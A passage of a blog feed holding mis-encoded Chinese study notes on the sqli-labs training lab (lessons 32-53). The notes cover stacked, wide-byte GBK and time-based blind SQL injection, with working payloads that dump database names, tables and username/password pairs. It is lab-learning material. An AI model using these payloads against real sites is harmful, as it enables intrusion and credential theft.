payloadç„¶åæ¯”å¯¹é¡µé¢è¿”å›å¾—ç»“æœã€‚ä¸å¤šèµ˜è¿°ã€‚</p><h2 id="è§£æ³•ä¸‰-æ—¶é—´ç›²æ³¨ï¼š"><a href="#è§£æ³•ä¸‰-æ—¶é—´ç›²æ³¨ï¼š" class="headerlink" title="è§£æ³•ä¸‰.æ—¶é—´ç›²æ³¨ï¼š"></a>è§£æ³•ä¸‰.æ—¶é—´ç›²æ³¨ï¼š</h2><p>æ—¶é—´æ³¨å…¥å¯ä»¥åˆ©ç”¨å¥å¼ä¸€æˆ–è€…å¥å¼äºŒã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å°±ç®€å•çš„æ‹¿çˆ†åº“ä¸¾ä¸ªä¾‹å­ï¼Œå‰©ä¸‹çš„å‚è€ƒæ—¶é—´ç›²æ³¨é‚£ä¸€å…³çš„ç¬”è®°ã€‚</p><p>çˆ†åº“ï¼š?sort=if(mid(database(),1,8)=â€™securityâ€™,1,sleep(5))</p><h2 id="lesson47ï¼š"><a href="#lesson47ï¼š" class="headerlink" title="lesson47ï¼š"></a>lesson47ï¼š</h2><p>å’Œlesson46ä¸€æ ·ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹çš„å˜åŒ–åšå‡ºé€‚å½“æ”¹å˜ï¼ˆåŒ…æ‹¬å¥å¼çš„æ”¹å˜è¿˜æœ‰æ·»åŠ æ³¨é‡Šç¬¦ç­‰ï¼‰å³å¯ã€‚</p><h2 id="lesson48ï¼š"><a href="#lesson48ï¼š" class="headerlink" title="lesson48ï¼š"></a>lesson48ï¼š</h2><p>åŒlesson46ï¼Œä½†æ˜¯é¡µé¢ä¸å†å‡ºç°æŠ¥é”™å›æ˜¾ï¼Œæ•…æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨ã€‚</p><h2 id="lesson49ï¼š"><a href="#lesson49ï¼š" class="headerlink" title="lesson49ï¼š"></a>lesson49ï¼š</h2><p>åŒlesson47ï¼Œä½†æ˜¯é¡µé¢ä¸å†å‡ºç°æŠ¥é”™å›æ˜¾ï¼Œæ•…æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨ã€‚</p><h2 id="lesson50ã€51ã€52-ã€53ï¼š"><a href="#lesson50ã€51ã€52-ã€53ï¼š" class="headerlink" title="lesson50ã€51ã€52 ã€53ï¼š"></a>lesson50ã€51ã€52 ã€53ï¼š</h2><p>å°±æ˜¯ä¹‹å‰å­¦çš„å †å æ³¨å…¥åŠ ä¸Šæ–°å­¦çš„order byåçš„æ³¨å…¥ï¼Œæ²¡ä»€ä¹ˆæ–°é¢–çš„ï¼Œæ‰“ç»„åˆæ‹³å°±å¥½äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;backgroundâ€”â€”Order-byåçš„æ³¨å…¥ï¼š&quot;&gt;&lt;a href=&quot;#backgroundâ€”â€”Order-byåçš„æ³¨å…¥ï¼š&quot; class=&quot;headerlink&quot; title=&quot;backgroundâ€”â€”Order byåçš„æ³¨å…¥ï¼š&quot;&gt;&lt;/a&gt;backgroundâ€”</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson38-45</title>
    <link href="http://example.com/2021/02/06/lesson38-45/"/>
    <id>http://example.com/2021/02/06/lesson38-45/</id>
    <published>2021-02-06T14:44:20.000Z</published>
    <updated>2021-02-07T10:52:51.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="backgroundâ€”â€”å †å æ³¨å…¥ï¼š"><a href="#backgroundâ€”â€”å †å æ³¨å…¥ï¼š" class="headerlink" title="backgroundâ€”â€”å †å æ³¨å…¥ï¼š"></a>backgroundâ€”â€”å †å æ³¨å…¥ï¼š</h1><p>åœ¨ SQL ä¸­ï¼Œ<code>;(åˆ†å·)</code>æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡ sql è¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ <code>; </code>ç»“æŸä¸€ä¸ª sql è¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚ä½†å¯¹äºä¸åŒæ•°æ®åº“ï¼ˆmysqlï¼Œsqlserverï¼Œoracleç­‰ï¼‰æ¥è¯´ï¼Œé™¤oracleä¸å…è®¸å¤–ï¼Œå…¶ä»–æ•°æ®åº“æˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ¡sqlè¯­å¥åç´§æ¥ç€æ„é€ ä¸‹ä¸€æ¡sqlè¯­å¥ã€‚</p><p><strong>è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜â€”â€”union injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ</strong>(1)åŒºåˆ«å°±åœ¨äº union æˆ–è€… union all æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ ä»»æ„çš„è¯­å¥ã€‚ </p><p>(2)å †å æ³¨å…¥ä¸ä¼šåƒè”åˆæ³¨å…¥é‚£æ ·å—ç¬¬ä¸€å¥sqlè¯­å¥å½±å“ã€‚æˆ‘ä»¬çŸ¥é“è”åˆæ³¨å…¥è¦æ»¡è¶³ç¬¬ä¸€å¥sqlè¯­å¥é”™è¯¯çš„æ¡ä»¶ä¸‹æ‰ä¼šæ‰§è¡Œåé¢æˆ‘ä»¬æ„é€ çš„sqlè¯­å¥ï¼Œè€Œå †å æ³¨å…¥æ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚</p><p>(3)åœ¨æˆ‘ä»¬çš„ web ç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬ äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœæ—¶åªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚ä¾‹ä»¥lesson38çš„ä¸€ä¸ªpayloadä¸ºä¾‹ï¼š?id=0â€™ union select 1,2,database();create table test like usersâ€“+è¿™æ ·æˆ‘ä»¬å¯ä»¥å‰å°è·å–æ•°æ®ä¿¡æ¯ï¼Œåå°ç¯¡æ”¹æ•°æ®ä¿¡æ¯ï¼Œå®ç°â€œåŒç®¡é½ä¸‹â€ã€‚</p><p><strong>spï¼šå…³äºæ•°æ®åº“çš„ä¸€äº›å¢åˆ æ”¹æŸ¥åœ¨å¦ä¸€ç¯‡åšå®¢å·²ç»ä¸“é—¨ä»‹ç»äº†ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚</strong></p><h2 id="lesson38ï¼š"><a href="#lesson38ï¼š" class="headerlink" title="lesson38ï¼š"></a>lesson38ï¼š</h2><p>è®¤è¯†ä¸€ä¸‹æ–°å‡½æ•°ï¼š</p><ul><li><p>mysqli_connect()å‡½æ•°ï¼š<br>åŠŸèƒ½ï¼šæ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æ–°çš„è¿æ¥ã€‚<br>è¯­æ³•ï¼šmysqli_connect(host,username,password,dbname,port,socket)ï¼›<img src="/lesson38/1.png" alt="1"></p></li><li><p>mysqli_select_db()å‡½æ•°ï¼š<br>ä½œç”¨ï¼šç”¨äºæ›´æ”¹è¿æ¥çš„é»˜è®¤æ•°æ®åº“ã€‚<br>è¯­æ³•ï¼šmysqli_select_db(connection,dbname)<img src="/lesson38/2.png" alt="2"></p></li><li><p>mysqli_multi_query()å‡½æ•°ï¼š<br>è¯­æ³•ï¼šmysqli_multi_query(connection,query)ï¼›</p><p>åŠŸèƒ½ï¼šæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚<img src="/lesson38/3.jpg" alt="3"></p><p><strong>æ³¨ï¼šè¿™ä¸ªå‡½æ•°æ˜¯å¯å®ç°å †å æ³¨å…¥çš„é‡è¦å› ç´ ï¼</strong></p></li><li><p>mysql_store_result()å‡½æ•°ï¼š<br>åŠŸèƒ½ï¼šç”¨äºå°†mysqli_query()æŸ¥è¯¢çš„ç»“æœé›†å­˜å‚¨åˆ°å˜é‡ä¸­</p></li><li><p>mysqli_more_results()å‡½æ•°ï¼š<br>è¯­æ³•ï¼šmysqli_more_results(connection);<br>å‚æ•°ï¼šconnectionâ€”â€”å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„mysqlè¿æ¥<br>åŠŸèƒ½ï¼šæ£€æŸ¥ä¸€ä¸ªå¤šæŸ¥è¯¢æ˜¯å¦æœ‰æ›´å¤šçš„ç»“æœã€‚</p></li><li><p>mysqli_fetch_row() å‡½æ•°ï¼š</p><p>è¯­æ³•ï¼šmysqli_fetch_row(result)ï¼›</p><p>å‚æ•°ï¼šresultâ€”â€”å¿…é¡»ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœ  é›†æ ‡è¯†ç¬¦ã€‚</p><p>åŠŸèƒ½ï¼šä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œï¼Œå¹¶ä½œä¸ºæšä¸¾æ•°ç»„è¿”å›ã€‚</p></li></ul><h2 id="lesson39-amp-40-amp-41ï¼š"><a href="#lesson39-amp-40-amp-41ï¼š" class="headerlink" title="lesson39&amp;40&amp;41ï¼š"></a>lesson39&amp;40&amp;41ï¼š</h2><p>å°±æ”¹å˜äº†idé—­åˆæ–¹å¼ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å˜åŒ–å³å¯ï¼Œå…¶ä½™ä¸lesson38ä¸€è‡´ã€‚</p><h2 id="lesson42ï¼š"><a href="#lesson42ï¼š" class="headerlink" title="lesson42ï¼š"></a>lesson42ï¼š</h2><p>è¿™å…³å¯ä»¥ç”¨äºŒé˜¶æ³¨å…¥ï¼Œä½†æ˜¯æ²¡å¿…è¦ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å¯†ç æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå»¶æ—¶æ³¨å…¥ã€‚æˆ–è€…ç”¨æˆ‘ä»¬æ–°å­¦çš„å †å æ³¨å…¥ã€‚</p><p>åœ¨æˆ‘ä»¬ä½¿ç”¨å †å æ³¨å…¥æ—¶è™½ç„¶é¡µé¢è¿”å›é”™è¯¯ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ï¼Œè¿˜æ˜¯å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadæ‰§è¡Œlã€‚</p><h2 id="lesson43-amp-44-amp-45ï¼š"><a href="#lesson43-amp-44-amp-45ï¼š" class="headerlink" title="lesson43&amp;44&amp;45ï¼š"></a>lesson43&amp;44&amp;45ï¼š</h2><p>å°±æ”¹å˜äº†idé—­åˆæ–¹å¼ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å˜åŒ–å³å¯ï¼Œå…¶ä½™ä¸lesson42ä¸€è‡´ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;backgroundâ€”â€”å †å æ³¨å…¥ï¼š&quot;&gt;&lt;a href=&quot;#backgroundâ€”â€”å †å æ³¨å…¥ï¼š&quot; class=&quot;headerlink&quot; title=&quot;backgroundâ€”â€”å †å æ³¨å…¥ï¼š&quot;&gt;&lt;/a&gt;backgroundâ€”â€”å †å æ³¨å…¥ï¼š&lt;/h1&gt;&lt;p&gt;åœ¨ SQL ä¸­ï¼Œ&lt;c</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson32-37</title>
    <link href="http://example.com/2021/02/06/lesson32-37/"/>
    <id>http://example.com/2021/02/06/lesson32-37/</id>
    <published>2021-02-06T05:17:38.000Z</published>
    <updated>2021-02-26T04:39:49.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š"><a href="#backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š" class="headerlink" title="backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š"></a>backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š</h1><ul><li><strong>åŸç†ï¼š</strong>mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ï¼ˆå‰ä¸€ä¸ªå­—ç¬¦çš„asciiç å¿…é¡»å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚ï¼‰ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ã€‚</li><li>ä»¥lesson32ä¸ºä¾‹ï¼ŒæŸ¥çœ‹æºç å‘ç°PHPä¼šå¯¹<code>\ï¼ˆåæ–œæ ï¼‰</code>,<code>&#39;ï¼ˆå•å¼•å·ï¼‰</code>,<code>&quot;ï¼ˆåŒå¼•å·ï¼‰</code>åšè½¬ä¹‰å¤„ç†</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote <span class="keyword">with</span> a backslash</span><br><span class="line">    $<span class="keyword">string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return $string;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// take the variables </span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;id&#x27;]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span></span><br><span class="line"><span class="string">//echo &quot;</span>The filtered request <span class="keyword">is</span> :<span class="string">&quot; .$id . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="string">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connectivity </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql_query(&quot;</span><span class="keyword">SET</span> <span class="keyword">NAMES</span> gbk<span class="string">&quot;);</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">//!å¯¹äºæºç çš„è§£è¯»ï¼šæˆ‘è®¤ä¸º24-26è¡Œçš„å‘½ä»¤ç›®çš„æ˜¯å°†sqlè¯­å¥ç”¨gbkç¼–ç ï¼Œä»¥é˜²å¸¦å…¥æ•°æ®åº“åä¹±ç ã€‚</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨å®ƒä¼šå°†sqlè¯­å¥è½¬ä¸ºgbkç¼–ç ï¼Œé€šè¿‡åå¹¶<code>\ï¼ˆurlç¼–ç %5cï¼‰</code>çš„æ–¹å¼ç»•å¼€å…¶å¯¹å•å¼•å·çš„è½¬ä¹‰ã€‚ä¾‹å¦‚ï¼š%aa%5cï¼Œè¿™åœ¨gbkç¼–è¯‘åæˆä¸ºä¸€ä¸ªæ±‰å­—ã€‚ï¼ˆgbkç¼–ç è¡¨<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%EF%BC%89%E6%AF%94%E5%A6%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.phpï¼‰æ¯”å¦‚</a> <code>ä¹—</code> å­—ç¬¦ï¼ŒGBKç¼–ç  %81%5C</p><p><strong>è¡¥å……ï¼š</strong>æœ‰äº›ç¬¦å·ï¼ˆ<code>#</code> <code>$</code> <code>^</code> <code>&amp;</code> <code>* </code> <code>+</code> =ï¼‰åœ¨URLä¸­æ˜¯ä¸èƒ½ç›´æ¥ä¼ é€’çš„ï¼Œå¦‚æœè¦åœ¨URLä¸­ä¼ é€’è¿™äº›ç‰¹æ®Šç¬¦å·ï¼Œé‚£ä¹ˆå°±è¦ä½¿ç”¨ä»–ä»¬çš„ç¼–ç äº†ã€‚ç¼–ç çš„æ ¼å¼ä¸ºï¼š%åŠ å­—ç¬¦çš„ASCIIç ï¼Œå³ä¸€ä¸ªç™¾åˆ†å·%ï¼Œåé¢è·Ÿå¯¹åº”å­—ç¬¦çš„ASCIIï¼ˆ16è¿›åˆ¶ï¼‰ç å€¼ã€‚ï¼ˆURLç¼–ç å°±æ˜¯åœ¨uft-8ç¼–ç çš„åŸºç¡€ä¸Šï¼Œç»™ç¼–ç çš„æ¯ä¸ªå­—èŠ‚åŠ ä¸Šç™¾åˆ†å·ã€‚ï¼‰</p><h2 id="lesson32ï¼š"><a href="#lesson32ï¼š" class="headerlink" title="lesson32ï¼š"></a>lesson32ï¼š</h2><h3 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h3><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><h3 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šçˆ†è¡¨æœ¬åº”è¯¥æ˜¯?id=%aaâ€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™â€“+</p><p>ä½†æ˜¯å› ä¸ºPHPå¯¹<code>&#39;</code>è½¬ä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºsecurity</p><h3 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure><h3 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+</span><br></pre></td></tr></table></figure><h2 id="lesson33ï¼š"><a href="#lesson33ï¼š" class="headerlink" title="lesson33ï¼š"></a>lesson33ï¼š</h2><p>å’Œlesson32ä¸€æ¨¡ä¸€æ ·ã€‚</p><h2 id="lesson34ï¼š"><a href="#lesson34ï¼š" class="headerlink" title="lesson34ï¼š"></a>lesson34ï¼š</h2><p>è¿™å…³æˆ‘è¿˜ä»¥ä¸ºä¼šå’Œä¹‹å‰ä¸¤å…³ä¸€æ ·ï¼Œåªä¸è¿‡æ”¹ä¸ºpostç±»å‹ï¼Œç»“æœå‘ç°äº†ä¸€äº›ä¸åŒã€‚</p><p>å½“æˆ‘åœ¨usernameè¾“å…¥admin%aaâ€™ union select 1,database()#ï¼Œç™»å…¥å¤±è´¥ï¼ŒæŒ‰ç†æ¥è¯´ä¸åº”è¯¥å‘€ã€‚äºæ˜¯æˆ‘ç”¨burpsuiteæŠ“åŒ…ï¼š</p><p><img src="/lesson32/1.png" alt="1"></p><p>æˆ‘ä»¬æ˜æ˜è¾“å…¥çš„uname=admin%aaâ€™ union select 1,database()#ï¼Œå¯æ˜¯æˆ‘ä»¬çœ‹åˆ°å¤šäº†ä¸€ä¸ª<code>25</code>åœ¨%aaä¸­é—´ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µå‘¢ï¼Ÿ<strong>åŸæ¥ï¼Œgetä¸postæäº¤æ•°æ®ç±»å‹ä¸åŒï¼Œgetå‹å¦‚æœè¾“å…¥ç¬¦åˆurlçš„æ ¼å¼é‚£ä¹ˆå°±ç›´æ¥ä»¥urlå½¢å¼æäº¤ï¼Œä¹Ÿå°±æ˜¯è¯´é‡åˆ°%aaè¿™ç§ç›´æ¥å½“åšurlç¼–ç å¤„ç†ï¼Œè€Œpostå‹å´ä¸æ˜¯è¿™æ ·ï¼Œä»–ä¼šæŠŠä½ æäº¤çš„%aaå½“åšæ­£å¸¸æ•°æ®ï¼Œç„¶åè¿›è¡Œurlç¼–ç ï¼Œäºæ˜¯å°±å˜æˆäº†%25aaã€‚</strong></p><ul><li><p>é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆé¿å…è¿™ä¸ªé—®é¢˜å‘¢?</p></li><li><p>æˆ‘ä»¬å¯ä»¥ç”¨burpæŠ“åŒ…ï¼Œæ‰‹åŠ¨å»æ‰<code>25</code></p></li></ul><p><strong>è¡¥å……ï¼šä¸åŒç±»å‹ç¼–ç </strong></p><p>UTF-16ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—æ¯å­—ç¬¦æˆ–ä¸€ä¸ªæ±‰å­—å­—ç¬¦å­˜å‚¨éƒ½éœ€è¦2ä¸ªå­—èŠ‚ï¼ˆUnicodeæ‰©å±•åŒºçš„ä¸€äº›æ±‰å­—å­˜å‚¨éœ€è¦4ä¸ªå­—èŠ‚ï¼‰ã€‚<br>UTF-8ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—ç¬¦ç­‰äºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸‰ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸‰ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸€ä¸ªå­—èŠ‚<br>Unicodeç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡ç­‰äºä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸¤ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ã€‚</p><p>â€”ï¼‰æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å¦å¤–ä¸€ç§æ–¹å¼ï¼š?id=ç‰›â€™ or 1=1#    </p><p><img src="/lesson32/2.png" alt="2"></p><p>åœ¨ç»è¿‡urlç¼–ç åï¼Œ<code>ç‰›</code>è¢«ç¼–ç æˆä¸‰ä¸ªå­—èŠ‚åŠ ä¸Šå•å¼•å·ä¸€ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå•å¼•å·è¢«è½¬ä¹‰ååæ–œæ ä¸€ä¸ªå­—èŠ‚ï¼Œæ€»å…±äº”ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“gbkç¼–ç æ—¶ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€æ±‰å­—ï¼Œé‚£ä¹ˆè¿™æ ·è½¬ä¹‰å•å¼•å·ç”¨çš„åæ–œæ è¢«åˆå¹¶ï¼Œå•å¼•å·â€œé€ƒé€¸â€æˆåŠŸã€‚</p><ul><li><a href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.phpåœ¨çº¿Unicodeå’ŒUTFç¼–ç è½¬æ¢ç½‘å€</a></li></ul><h2 id="lesson35ï¼š"><a href="#lesson35ï¼š" class="headerlink" title="lesson35ï¼š"></a>lesson35ï¼š</h2><p>æ²¡è¥å…»</p><h2 id="lesson36ï¼š"><a href="#lesson36ï¼š" class="headerlink" title="lesson36ï¼š"></a>lesson36ï¼š</h2><p>å’Œlesson32ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠè¿‡æ»¤å‡½æ•°æ”¹æˆmysql_real_escape_stringï¼ˆï¼‰ã€‚</p><h2 id="lesson37ï¼š"><a href="#lesson37ï¼š" class="headerlink" title="lesson37ï¼š"></a>lesson37ï¼š</h2><p>å’Œlesson34ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠè¿‡æ»¤å‡½æ•°æ”¹æˆmysql_real_escape_stringï¼ˆï¼‰ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š&quot;&gt;&lt;a href=&quot;#backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š&quot; class=&quot;headerlink&quot; title=&quot;backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š&quot;&gt;&lt;/a&gt;backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson29-31</title>
    <link href="http://example.com/2021/02/05/lesson29-31/"/>
    <id>http://example.com/2021/02/05/lesson29-31/</id>
    <published>2021-02-05T08:14:01.000Z</published>
    <updated>2021-02-06T05:17:19.184Z</updated>
    
